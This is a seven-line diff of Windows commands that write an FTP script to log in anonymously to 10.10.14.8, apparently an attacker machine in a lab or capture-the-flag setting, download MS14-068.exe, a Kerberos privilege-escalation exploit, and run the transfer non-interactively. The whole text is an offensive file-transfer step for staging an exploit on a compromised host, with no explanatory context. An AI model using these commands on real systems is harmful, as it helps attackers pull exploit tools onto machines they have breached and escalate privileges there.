@@ -1,0 +1,7 @@
+echo open 10.10.14.8 21 > ftp.txt
+echo user anonymous >> ftp.txt
+echo password >> ftp.txt
+echo bin >> ftp.txt
+echo mget MS14-068.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -i -n -s:ftp.txt
